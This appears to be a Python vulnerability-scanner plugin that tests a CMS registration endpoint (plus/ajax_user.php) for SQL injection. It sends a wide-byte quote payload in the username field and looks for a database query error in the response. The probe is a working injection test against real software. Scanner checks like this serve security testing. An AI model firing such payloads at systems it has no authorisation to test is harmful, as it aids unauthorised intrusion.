#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        detail = u''
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl="%s%s"%(url,"plus/ajax_user.php?act=do_reg")
        data="username=%E9%8C%A6%27&password=aasdsda&email=aasdsda&member_type=1"
        headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5","Accept": "text/plain"}
        
        
        
        
        
        
        
        
        
        #res, content = http.request(expurl,"POST",data,headers)
        res, content = yx_httplib2_request(http,expurl,"POST",data,headers)
        #print content
        if res['status'] == '200' and content.find('Query error:select * from')>=0:
            #print ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
            request = postRequest(expurl,"POST",headers,data)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:qscms_ajax_user_SqlInjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:qscms_ajax_user_SqlInjectionScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
